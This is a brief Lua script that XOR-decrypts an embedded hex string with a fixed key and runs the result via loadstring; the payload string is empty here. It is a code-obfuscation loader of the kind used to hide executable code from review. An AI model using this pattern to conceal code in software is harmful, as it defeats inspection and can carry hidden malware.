local k={96,94,43,238,136,177,17,6,133,212,42,75,67,54,90,173,237,103,74,187,85,84,43,188,34,45,159,189,164,165,133,44}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
